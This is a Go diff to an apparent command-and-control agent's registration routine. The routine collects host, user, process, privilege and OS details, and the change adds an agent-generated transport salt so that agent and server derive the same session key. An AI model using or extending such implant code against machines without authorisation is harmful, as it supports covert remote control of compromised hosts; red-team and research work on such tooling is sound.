@@ -54,24 +54,31 @@ func CreateInfo() ([]byte, []byte) {
 
 	randKey := make([]byte, 16)
 	_, _ = rand.Read(randKey)
+	// ★ transportSalt 必须由 **agent** 生成并随 SessionInfo 上报：服务端把
+	// SessionKey 组成为 EncryptKey || TransportSalt，两侧才算用同一份密钥。
+	// 原先服务端自己随机造 salt ⇒ agent 永远学不到 ⇒ 注册后所有密文互相解不开。
+	transportSalt := make([]byte, 16)
+	_, _ = rand.Read(transportSalt)
 
 	info := utils.SessionInfo{
-		Process:    path,
-		PID:        os.Getpid(),
-		User:       username,
-		Host:       host,
-		Ipaddr:     ip,
-		Elevated:   functions.IsElevated(),
-		Acp:        acp,
-		Oem:        oemcp,
-		Os:         runtime.GOOS,
-		OSVersion:  osVersion,
-		EncryptKey: randKey,
+		Process:       path,
+		PID:           os.Getpid(),
+		User:          username,
+		Host:          host,
+		Ipaddr:        ip,
+		Elevated:      functions.IsElevated(),
+		Acp:           acp,
+		Oem:           oemcp,
+		Os:            runtime.GOOS,
+		OSVersion:     osVersion,
+		EncryptKey:    randKey,
+		TransportSalt: transportSalt,
 	}
 
 	data, _ := msgpack.Marshal(info)
 
-	return data, randKey
+	fullKey := append(append([]byte(nil), randKey...), transportSalt...)
+	return data, fullKey
 }
 
 var profiles []utils.Profile
